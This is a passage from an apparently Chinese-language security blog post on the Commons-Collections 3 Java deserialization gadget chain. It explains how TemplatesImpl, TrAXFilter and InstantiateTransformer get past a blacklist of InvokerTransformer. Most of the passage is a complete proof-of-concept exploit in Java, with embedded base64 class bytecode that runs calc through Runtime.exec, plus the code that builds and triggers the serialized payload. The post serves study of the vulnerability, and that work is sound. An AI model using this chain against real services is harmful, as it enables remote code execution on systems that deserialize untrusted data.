        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer", null, null)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

很好理解，只需要将第⼀个demo中InvokerTransformer执行的"方法"改 成`TemplatesImpl::newTransformer()`

其中，`setFieldValue`方法用来设置私有属性。这里设置了三个属性: `bytecodes`、`_name`和`_tfactory`。

`_bytecodes` 是由字节码组成的数组。`_name` 可以是任意字符串， 只要不为null即可。`_tfactory` 需要是一个`TransformerFactoryImpl`对象，因为`TemplatesImpl#defineTransletClasses()`方法里有调用到`_tfactory.getExternalExtensionsMap()`，如果是null会出错。

### 真正的CC3(避免使用InvokerTransformer)

随着2015年ysoserial工具得发布，防御技术也在不断进步，诞生了类似[SerialKiller](https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf)这样的⼯具

在他最初的黑名单中过滤了InvokerTransformer，CC3就是为了bypass这一限制诞生的

`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`这个类的构造⽅法中调⽤了`(TransformerImpl) templates.newTransformer()`，免去了我们使⽤ `InvokerTransformer` ⼿⼯调⽤`newTransformer()`⽅法这⼀步：

![image-20210809135002812](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532991.png)

当然，缺少了InvokerTransformer, TrAXFilter的构造方法也是无法调用的。这里会用到一个新的Transformer,就是`org.apache.commons.collections.functors.InstantiateTransformer`。

`InstantiateTransformer`也是一 个实现了`Transformer`接口的类, 他的作用就是调用构造方法。所以，我们实现的目标就是利用`InstantiateTransformer`来调用到`TrAXFiter`的构造方法, 再利
用其构造方法里的`templates.newTransformer()调`用到`Templateslmpl`里的字节码。

#### Gadget

```java
HashMap#readObject->HashMap#hash->TiedMapEntry#hashCode()->TiedMapEntry#getValue->LazyMap#get->
ConstantTransformer#transform->InstantiateTransformer#transform->
->TrAXFilter#TrAXFilter->TemplatesImpl#newTransformer->TemplatesImpl#getTransletInstance-> TemplatesImpl#defineTransletClasses
-> TransletClassLoader#defineClass->RCE
```

#### poc

自己根据p神写的东西改出来的（虽然基本算都是cv），利用了LazyMap兼容了高版本的jdk

```java
import java.io.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.util.Base64;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

class CommonsCollectionsIntro3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAARjYWxjDAAyADMBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA0ABQBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAoACwAAAAAAAwABAAwADQACAA4AAAAZAAAAAwAAAAGxAAAAAQAPAAAABgABAAAACwAQAAAABAABABEAAQAMABIAAgAOAAAAGQAAAAQAAAABsQAAAAEADwAAAAYAAQAAAAwAEAAAAAQAAQARAAEAEwAUAAEADgAAAGwAAgACAAAAHiq3AAGyAAISA7YABLgABRIGtgAHV6cACEwrtgAJsQABAAwAFQAYAAgAAgAPAAAAHgAHAAAADwAEABAADAASABUAFQAYABMAGQAUAB0AFgAVAAAAEAAC/wAYAAEHABYAAQcAFwQAAQAYAAAAAgAZ");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue"); //为了调用hashCode()

        outerMap.remove("keykey");    //因为LazyMap触发要求是获取不到这个value，所以要删除

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        //序列化流写入文件
//        try
//        {
//            FileOutputStream fileOut = new FileOutputStream("D:\\tmp\\e.ser");
//            ObjectOutputStream out = new ObjectOutputStream(fileOut);
//            out.writeObject(expMap);
//            out.close();
//            fileOut.close();
//            System.out.println("Serialized data is saved in D:\\tmp\\e.ser");
//        }catch(IOException i)
//        {
//            i.printStackTrace();
//        }

        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

利用了cc6的`TiedMapEntry`来通杀Java7和8，由于触发的时候会报错退出，使用了`fakeTransformers`来避免构造时触发，最后在生成序列化数据流的时候再把真正的`ChainedTransformer`替换进去

![image-20210809135418059](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532319.png)

